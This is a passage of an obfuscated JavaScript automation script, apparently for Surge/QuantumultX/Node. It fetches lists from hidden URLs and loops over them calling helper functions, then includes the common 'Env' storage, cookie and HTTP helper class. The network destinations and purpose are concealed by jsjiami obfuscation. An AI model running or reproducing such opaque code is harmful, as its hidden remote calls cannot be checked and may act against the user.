_0x4ae123[_0x4092('78','j!a#')](_0xf33802);}};if(_0x4ae123[_0x4092('79','9jr(')](_0x4ae123[_0x4092('7a','%Q7w')],_0x4ae123[_0x4092('7b','&arA')])){try{if(_0x4ae123[_0x4092('7c','9%Fv')](_0x4ae123[_0x4092('7d','m0t2')],_0x4ae123[_0x4092('7e','l4s!')])){_0xf73516[_0x4092('7f','Di]h')](_0x2261d4);}else{if(_0x1db46d){console[_0x4092('80','@ugn')]($[_0x4092('81','9%Fv')]+_0x4092('82','9%Fv'));}else{if(_0x4ae123[_0x4092('83','PqgK')](_0x4ae123[_0x4092('84','(xHS')],_0x4ae123[_0x4092('85','FQsp')])){if(_0x4ae123[_0x4092('86','K)lL')](safeGet,_0x2df5ed)){if(_0x4ae123[_0x4092('87','4c*&')](_0x4ae123[_0x4092('88','PqgK')],_0x4ae123[_0x4092('88','PqgK')])){_0x2df5ed=JSON[_0x4092('89','[QtP')](_0x2df5ed);}else{console[_0x4092('8a','q0UE')]($[_0x4092('8b','7lm]')]+_0x4092('8c','m0t2'));}}}else{if(_0x4ae123[_0x4092('8d','j1LZ')](safeGet,_0x2df5ed)){_0x2df5ed=JSON[_0x4092('8e','7^P2')](_0x2df5ed);}}}}}catch(_0x43f3e1){$[_0x4092('8f','uQ7j')](_0x43f3e1);}finally{if(_0x4ae123[_0x4092('90','sp9K')](_0x4ae123[_0x4092('91','T7Tm')],_0x4ae123[_0x4092('92','XdlI')])){_0x4ae123[_0x4092('93','dQgo')](_0x2261d4);}else{_0x4ae123[_0x4092('94','XV9R')](_0x2261d4);}}}else{$[_0x4092('95','2xnV')](e);}});}else{console[_0x4092('96','9jr(')]($[_0x4092('97','q0UE')]+_0x4092('98','NuHP'));}});}function shuye72(){var _0x4d1bd9={'jUiIA':function(_0x3fbc1,_0x5d3182){return _0x3fbc1!==_0x5d3182;},'zkvWk':_0x4092('99','l4s!'),'gLACj':_0x4092('9a','LaaX'),'mggaQ':function(_0x59cbcf,_0x132abc){return _0x59cbcf!==_0x132abc;},'tXrWv':_0x4092('9b','y$8Q'),'stENH':_0x4092('9c','d88e'),'uyLHL':function(_0x2ec86b){return _0x2ec86b();},'SjQbB':function(_0x4e08ba,_0x156bed){return _0x4e08ba!==_0x156bed;},'nVLBe':_0x4092('9d','XV9R'),'SaRkq':function(_0xc88f35,_0x1c89cd){return _0xc88f35<_0x1c89cd;},'lBWhi':function(_0x37a2bb,_0x379217){return _0x37a2bb(_0x379217);},'gyKEy':function(_0x311bd8){return _0x311bd8();},'KZNWT':function(_0x1112d4,_0xd7b981){return _0x1112d4===_0xd7b981;},'wKKTG':_0x4092('9e','vZ8V'),'iijnt':_0x4092('9f','zU48'),'QeotW':_0x4092('a0','PqgK'),'OCaHw':_0x4092('a1','K)lL')};return new Promise(_0x3dea43=>{var _0x44dc8c={'BmrYy':function(_0x3c7164){return _0x4d1bd9[_0x4092('a2','QoK8')](_0x3c7164);}};if(_0x4d1bd9[_0x4092('a3','XV9R')](_0x4d1bd9[_0x4092('a4','sp9K')],_0x4d1bd9[_0x4092('a5','XV9R')])){data=JSON[_0x4092('a6','%Q7w')](data);}else{$[_0x4092('a7','LaaX')]({'url':_0x4d1bd9[_0x4092('a8','sp9K')],'headers':{'User-Agent':_0x4d1bd9[_0x4092('a9','q0UE')]},'timeout':0x1388},async(_0xaf8ba3,_0x2cab59,_0x44368f)=>{try{if(_0x4d1bd9[_0x4092('aa','[0oS')](_0x4d1bd9[_0x4092('ab','K)lL')],_0x4d1bd9[_0x4092('ac','8b6D')])){$[_0x4092('ad','vZ8V')](e);}else{if(_0xaf8ba3){if(_0x4d1bd9[_0x4092('ae','#1Fs')](_0x4d1bd9[_0x4092('af','9jr(')],_0x4d1bd9[_0x4092('b0','FQsp')])){console[_0x4092('b1','Di]h')]($[_0x4092('b2','T7Tm')]+_0x4092('b3','K)lL'));}else{console[_0x4092('b4','9%Fv')]($[_0x4092('b5','*A3A')]+_0x4092('b6','*A3A'));}}else{if(_0x4d1bd9[_0x4092('b7','P5G)')](_0x4d1bd9[_0x4092('b8','%Q7w')],_0x4d1bd9[_0x4092('b9','NuHP')])){$[_0x4092('ba','f[y7')]=JSON[_0x4092('bb','4c*&')](_0x44368f);await _0x4d1bd9[_0x4092('bc','pmAu')](shuye73);if(_0x4d1bd9[_0x4092('bd','4at#')]($[_0x4092('be','Y%R%')][_0x4092('bf','sp9K')][_0x4092('c0','QoK8')],0x0)){if(_0x4d1bd9[_0x4092('c1','y3po')](_0x4d1bd9[_0x4092('c2','pmAu')],_0x4d1bd9[_0x4092('c3','7lm]')])){_0x44dc8c[_0x4092('c4','[0oS')](_0x3dea43);}else{for(let _0x33f605=0x0;_0x4d1bd9[_0x4092('c5','[QtP')](_0x33f605,$[_0x4092('c6','sp9K')][_0x4092('c7','pmAu')][_0x4092('c8','Di]h')]);_0x33f605++){let _0x5a08dd=$[_0x4092('c9','fe^b')][_0x4092('ca','&arA')][_0x33f605];await $[_0x4092('cb','uQ7j')](0x1f4);await _0x4d1bd9[_0x4092('cc','pmAu')](wuzhi,_0x5a08dd);}await _0x4d1bd9[_0x4092('cd','fe^b')](shuye74);}}}else{if(_0xaf8ba3){console[_0x4092('ce','y3po')]($[_0x4092('cf','l4s!')]+_0x4092('d0','QoK8'));}else{$[_0x4092('d1','pbkF')]=JSON[_0x4092('d2','9%Fv')](_0x44368f);$[_0x4092('d3','%Q7w')]=$[_0x4092('d4','FQsp')][_0x4092('d5','&arA')];}}}}}catch(_0x3eddd3){$[_0x4092('d6','0o^4')](_0x3eddd3);}finally{_0x4d1bd9[_0x4092('d7','j1LZ')](_0x3dea43);}});}});}function shuye73(){var _0x18530f={'Igkxo':function(_0xcb0ed1){return _0xcb0ed1();},'ilISW':function(_0x3ac91a,_0x52971d){return _0x3ac91a===_0x52971d;},'vQibL':_0x4092('d8','f[y7'),'rNlsz':_0x4092('d9','%Q7w'),'PfHMl':_0x4092('da','q0UE')};return new Promise(_0x1bc02c=>{var _0x5b1722={'oOKdE':function(_0x19e93a){return _0x18530f[_0x4092('db','4at#')](_0x19e93a);}};if(_0x18530f[_0x4092('dc','%Q7w')](_0x18530f[_0x4092('dd','q0UE')],_0x18530f[_0x4092('de','7^P2')])){$[_0x4092('df','(xHS')]({'url':_0x18530f[_0x4092('e0','y$8Q')],'headers':{'User-Agent':_0x18530f[_0x4092('e1','XV9R')]},'timeout':0x1388},async(_0x133d1f,_0x4e1e0e,_0x20de2d)=>{try{if(_0x133d1f){console[_0x4092('e2','HMuf')]($[_0x4092('e3','[QtP')]+_0x4092('e4','j!a#'));}else{$[_0x4092('e5','&arA')]=JSON[_0x4092('e6','j!a#')](_0x20de2d);$[_0x4092('e7','0o^4')]=$[_0x4092('e8','MY)K')][_0x4092('e9','8b6D')];}}catch(_0x55754d){$[_0x4092('ea','FQsp')](_0x55754d);}finally{_0x5b1722[_0x4092('eb','QoK8')](_0x1bc02c);}});}else{if(err){console[_0x4092('ec','[0oS')]($[_0x4092('ed','d88e')]+_0x4092('8c','m0t2'));}else{data=JSON[_0x4092('ee','NuHP')](data);}}});}function shuye74(){var _0x492e69={'PYJfA':function(_0x28fd38){return _0x28fd38();},'wtvrS':function(_0x13829c,_0x9f8037){return _0x13829c===_0x9f8037;},'CerAE':_0x4092('ef','pmAu'),'pLrbn':_0x4092('f0','zU48'),'EWIEY':function(_0x25e7de,_0x4e5922){return _0x25e7de!==_0x4e5922;},'SkLZj':_0x4092('f1','T7Tm'),'kvUvf':_0x4092('f2','zU48'),'ZKCAg':function(_0x6c5ad0,_0x226a3b){return _0x6c5ad0(_0x226a3b);},'DMRLF':_0x4092('f3','(xHS'),'pwwWS':function(_0x392291,_0x2112b0){return _0x392291<_0x2112b0;},'uovXg':_0x4092('f4','4at#'),'jBWrv':_0x4092('f5','[0oS'),'BltNj':_0x4092('f6','pbkF'),'KbZVN':_0x4092('f7','d88e'),'vbfis':_0x4092('f8','QoK8')};return new Promise(_0x5cdaa5=>{var _0x14da24={'xSNGi':function(_0x5b19e5){return _0x492e69[_0x4092('f9','%Q7w')](_0x5b19e5);},'ezQzi':function(_0x31e4ce,_0x2c5099){return _0x492e69[_0x4092('fa','8b6D')](_0x31e4ce,_0x2c5099);},'dPQxX':_0x492e69[_0x4092('fb','FQsp')],'rOeMt':_0x492e69[_0x4092('fc','j1LZ')],'aaBDz':function(_0x2dd9d7,_0x169ed2){return _0x492e69[_0x4092('fd','[QtP')](_0x2dd9d7,_0x169ed2);},'LnWEt':_0x492e69[_0x4092('fe','Em&Y')],'ADqIs':function(_0x4552e5,_0xe43765){return _0x492e69[_0x4092('ff','HMuf')](_0x4552e5,_0xe43765);},'dsebk':_0x492e69[_0x4092('100','Di]h')],'oYTNe':function(_0x432efe,_0x440c6d){return _0x492e69[_0x4092('101','4at#')](_0x432efe,_0x440c6d);},'hmprY':function(_0x364512,_0x39c435){return _0x492e69[_0x4092('102','y3po')](_0x364512,_0x39c435);},'zEWFu':_0x492e69[_0x4092('103','XV9R')],'pqJWm':function(_0x3dc8b9,_0x1b94b2){return _0x492e69[_0x4092('104','l4s!')](_0x3dc8b9,_0x1b94b2);},'eRDaT':_0x492e69[_0x4092('105','d88e')]};if(_0x492e69[_0x4092('106','d88e')](_0x492e69[_0x4092('107','j1LZ')],_0x492e69[_0x4092('108','*A3A')])){$[_0x4092('109','d88e')](e);}else{$[_0x4092('10a','7^P2')]({'url':_0x492e69[_0x4092('10b','fe^b')],'headers':{'User-Agent':_0x492e69[_0x4092('10c','m0t2')]},'timeout':0x1388},async(_0x1dd8b0,_0x93b3de,_0x97002f)=>{var _0x411bb1={'KJAyO':function(_0x52f949){return _0x14da24[_0x4092('10d','dQgo')](_0x52f949);}};try{if(_0x14da24[_0x4092('10e','9jr(')](_0x14da24[_0x4092('10f','7lm]')],_0x14da24[_0x4092('110','Em&Y')])){$[_0x4092('111','9jr(')](e);}else{if(_0x1dd8b0){if(_0x14da24[_0x4092('112','7lm]')](_0x14da24[_0x4092('113','7lm]')],_0x14da24[_0x4092('114','l4s!')])){_0x14da24[_0x4092('115','sp9K')](_0x5cdaa5);}else{console[_0x4092('e2','HMuf')]($[_0x4092('116','HMuf')]+_0x4092('98','NuHP'));}}else{if(_0x14da24[_0x4092('117','*A3A')](_0x14da24[_0x4092('118','[0oS')],_0x14da24[_0x4092('119','fe^b')])){if(_0x14da24[_0x4092('11a','2xnV')](safeGet,_0x97002f)){$[_0x4092('11b','K)lL')]=JSON[_0x4092('11c','q0UE')](_0x97002f);if(_0x14da24[_0x4092('11d','uQ7j')]($[_0x4092('11e','FQsp')][_0x4092('11f','(xHS')],0x0)){if(_0x14da24[_0x4092('120','j1LZ')](_0x14da24[_0x4092('121','QoK8')],_0x14da24[_0x4092('122','l4s!')])){for(let _0x4a090b=0x0;_0x14da24[_0x4092('123','y3po')](_0x4a090b,$[_0x4092('124','(xHS')][_0x4092('125','T7Tm')][_0x4092('126','fe^b')]);_0x4a090b++){let _0x443038=$[_0x4092('c9','fe^b')][_0x4092('127','*A3A')][_0x4a090b];await $[_0x4092('128','P5G)')](0x1f4);await _0x14da24[_0x4092('129','XdlI')](wuzhi01,_0x443038);}}else{_0x97002f=JSON[_0x4092('12a','MY)K')](_0x97002f);}}}}else{console[_0x4092('12b','QoK8')]($[_0x4092('12c','izko')]+_0x4092('12d','&arA'));}}}}catch(_0x487c40){$[_0x4092('12e','PqgK')](_0x487c40);}finally{if(_0x14da24[_0x4092('12f','f[y7')](_0x14da24[_0x4092('130','%Q7w')],_0x14da24[_0x4092('131','j!a#')])){_0x14da24[_0x4092('132','7^P2')](_0x5cdaa5);}else{_0x411bb1[_0x4092('133','QoK8')](_0x5cdaa5);}}});}});};_0xodE='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}